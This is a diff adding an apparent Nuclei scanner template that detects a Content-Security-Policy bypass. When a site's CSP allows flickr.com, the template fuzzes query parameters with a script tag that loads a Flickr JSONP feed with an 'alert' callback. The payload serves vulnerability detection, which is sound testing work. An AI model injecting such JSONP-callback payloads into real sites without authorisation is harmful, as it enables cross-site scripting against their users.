@@ -1,0 +1,55 @@
+id: flickr-api-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Flickr API
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,flickr-api
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "flickr.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: flickr_api_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://api.flickr.com/services/feeds/photos_friends.gne?user_id=44979707@N00&friends=0&display_all=1&format=json&jsoncallback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "flickr_api_csp_xss == true"
+# digest: 490a004630440220037a448a7f8cb54687939b95d713bb3f53f0e6a1b696e9c49dab6cd5f125d44e02207eea483cf06a08237c36fdd8001bb736e823b237740a1e9e7bdf620186f7e814:922c64590222798bb761d5b6d8e72950
